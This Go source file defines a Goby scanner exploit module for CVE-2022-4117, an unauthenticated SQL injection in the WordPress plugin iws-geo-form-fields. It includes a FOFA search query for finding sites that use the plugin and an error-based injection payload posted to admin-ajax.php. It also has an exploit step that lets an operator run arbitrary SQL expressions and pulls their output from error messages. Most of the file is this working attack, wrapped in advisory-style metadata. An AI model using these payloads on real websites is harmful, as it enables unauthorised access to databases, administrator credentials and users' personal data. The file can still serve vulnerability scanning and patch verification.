package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin IWS SQL Injection Vulnerability (CVE-2022-4117)",
    "Description": "<p>iws-geo-form-fields is a easy to use WordPress plugin, It uses Ajax to dynamically populate Select fields in your form,It can add Country - State - City select field in your WordPress website.</p><p>iws-geo-form-fields &lt;=1.0 has an unauthorized SQL injection vulnerability.</p>",
    "Product": "WordPress Plugin IWS SQL",
    "Homepage": "https://wordpress.org/plugins/iws-geo-form-fields",
    "DisclosureDate": "2022-11-30",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/iws-geo-form-fields\"",
    "GobyQuery": "body=\"wp-content/plugins/iws-geo-form-fields\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://wordpress.org/plugins/iws-geo-form-fields/\">https://wordpress.org/plugins/iws-geo-form-fields/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://wpscan.com/vulnerability/1fac3eb4-13c0-442d-b27c-7b7736208193"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user(),database(),@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php?action=iws_gff_fetch_states",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "country_id=1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(123456)))a from information_schema.tables group by a)b)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php?action=iws_gff_fetch_states",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "country_id=1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select {{{sql}}}))a from information_schema.tables group by a)b)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|Duplicate\\s*entry\\s*'1(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-4117"
    ],
    "CNNVD": [
        "CNNVD-202212-3923"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Plugin IWS SQL注入漏洞（CVE-2022-4117）",
            "Product": "WordPress Plugin IWS SQL",
            "Description": "<p>iws-geo-form-fields是一个易于使用的 WordPress 插件，它使用 Ajax 动态填充表单中的选择字段，它可以在您的 WordPress 网站中添加国家 - 州 - 城市选择字段。<br></p><p>iws-geo-form-fields &lt;=1.0存在未授权SQL注入漏洞。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://wordpress.org/plugins/iws-geo-form-fields/\">https://wordpress.org/plugins/iws-geo-form-fields/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。\t<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin IWS SQL Injection Vulnerability (CVE-2022-4117)",
            "Product": "WordPress Plugin IWS SQL",
            "Description": "<p>iws-geo-form-fields is a easy to use WordPress plugin, It uses Ajax to dynamically populate Select fields in your form,It can add Country - State - City select field in your WordPress website.<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">iws-geo-form-fields &lt;=1.0</span> has an unauthorized SQL injection vulnerability.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://wordpress.org/plugins/iws-geo-form-fields/\">https://wordpress.org/plugins/iws-geo-form-fields/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}